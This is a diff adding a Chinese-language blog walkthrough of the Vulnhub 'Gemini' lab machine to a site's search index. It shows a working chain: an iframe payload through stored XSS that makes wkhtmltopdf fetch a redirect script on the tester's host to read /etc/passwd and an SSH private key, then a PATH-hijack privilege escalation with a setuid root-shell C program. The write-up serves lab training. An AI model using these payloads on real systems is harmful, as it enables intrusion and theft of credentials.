@@ -1094,4 +1094,65 @@
         <tag>Linux</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Gemini</title>
+    <url>/2022/02/05/Gemini/index/</url>
+    <content><![CDATA[<h1 id="Gemini"><a href="#Gemini" class="headerlink" title="Gemini"></a>Gemini</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><h5 id="下载地址：https-download-vulnhub-com-geminiinc-Gemini-Pentest-v1-zip"><a href="#下载地址：https-download-vulnhub-com-geminiinc-Gemini-Pentest-v1-zip" class="headerlink" title="下载地址：https://download.vulnhub.com/geminiinc/Gemini-Pentest-v1.zip"></a>下载地址：<a href="https://download.vulnhub.com/geminiinc/Gemini-Pentest-v1.zip">https://download.vulnhub.com/geminiinc/Gemini-Pentest-v1.zip</a></h5><h5 id="难度：middlum"><a href="#难度：middlum" class="headerlink" title="难度：middlum"></a>难度：middlum</h5><h5 id="运行环境：Vmware"><a href="#运行环境：Vmware" class="headerlink" title="运行环境：Vmware"></a>运行环境：Vmware</h5><hr>
+<h5 id="目标主机：-Debian-Linux-192-168-0-113"><a href="#目标主机：-Debian-Linux-192-168-0-113" class="headerlink" title="目标主机： Debian Linux 192.168.0.113"></a>目标主机： <em>Debian Linux 192.168.0.113</em></h5><h5 id="本机主机：-Kali-Linux-192-168-0-101"><a href="#本机主机：-Kali-Linux-192-168-0-101" class="headerlink" title="本机主机： Kali Linux 192.168.0.101"></a>本机主机： <em>Kali Linux 192.168.0.101</em></h5><hr>
+<p><code>环境变量篡改</code></p>
+<h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>依然是使用 <code>arp-scan</code>来进行扫描，得到的目标结果是 <code>192.168.0.113</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">[sudo] password for yifang: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.101</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1	c0:a5:dd:ab:6d:1e	SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.0.20	60:ee:5c:c9:a5:d8	SHENZHEN FAST TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.0.113	00:0c:29:47:ed:e7	VMware, Inc.(目标主机)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><p>使用<code>nmap</code>进行端口扫描</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202051117220.png"></p>
+<p>打开了<code>22</code>（ssh），<code>80</code>（http）端口</p>
+<h3 id="3-文件信息泄露"><a href="#3-文件信息泄露" class="headerlink" title="3.文件信息泄露"></a>3.文件信息泄露</h3><p>通过dirsearch寻找目标存在的页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202051410489.png"></p>
+<p>在页面 <code>/test2</code> 中得到了目标的站点的源码是开源的，在<code>github</code>中可以查看他的源码，</p>
+<p><a href="https://github.com/ionutvmi/master-login-system">https://github.com/ionutvmi/master-login-system</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202051409219.png"></p>
+<p>最终在github中得到了目标的登录密码和账号 <code>admin:1234</code> </p>
+<h3 id="4-漏洞发现"><a href="#4-漏洞发现" class="headerlink" title="4.漏洞发现"></a>4.漏洞发现</h3><p>在登录后发现目标后台只存在一个<code>xss</code>存储型，位置在修改个人信息处，好像并没有什么用处，只能做别的测试</p>
+<p>然后在生成pdf页面 <code>1</code>中发现目标使用了组件 <code>wkhtmltopdf</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202051437791.png"></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;http://192.168.0.101/shell.php?url=/etc/passwd&quot;</span> width=<span class="number">800</span> height=<span class="number">4000</span> &gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>iframe</code>标签进行访问包含目标的源数据</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">&#x27;location:file://&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>本机启动 <code>apache2</code>并放置文件 <code>shell.php</code></p>
+<p>成功读取到了目标的 <code>/etc/passwd</code>文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202051427642.png"></p>
+<h3 id="5-尝试登录"><a href="#5-尝试登录" class="headerlink" title="5.尝试登录"></a>5.尝试登录</h3><p>在<code>xss</code>处插入以下数据</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://192.168.0.101/shell.php?url=/home/gemini1/.ssh/id_rsa&quot; width=800 height=4000 &gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到了目标的 <code>id_rsa</code>文件，然后</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 400 id_rsa</span><br><span class="line">ssh gemini1@192.168.0.113 -i id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>最终成功登录</p>
+<h3 id="6-SUID提权"><a href="#6-SUID提权" class="headerlink" title="6.SUID提权"></a>6.SUID提权</h3><p>使用以下命令进行寻找可进行提权的文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm  -u+sx 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202051512514.png"></p>
+<p>发现存在一个listeninfo的文件</p>
+<p>使用<code>strings</code>命令 查看该文件的数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202051514709.png"></p>
+<p>其中<code>date</code>命令并没有做具体文件，也就是说他用的是系统变量，</p>
+<p>这时候使用以下命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=/home/gemini1/:$PATH</span><br></pre></td></tr></table></figure>
+
+<p>并创建该文件</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功提权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202202051523905.png"></p>
+<p>因为变量在索引时，是由前到后，因此只需要覆盖掉目标的系统变量即可</p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-middlum</tag>
+      </tags>
+  </entry>
 </search>
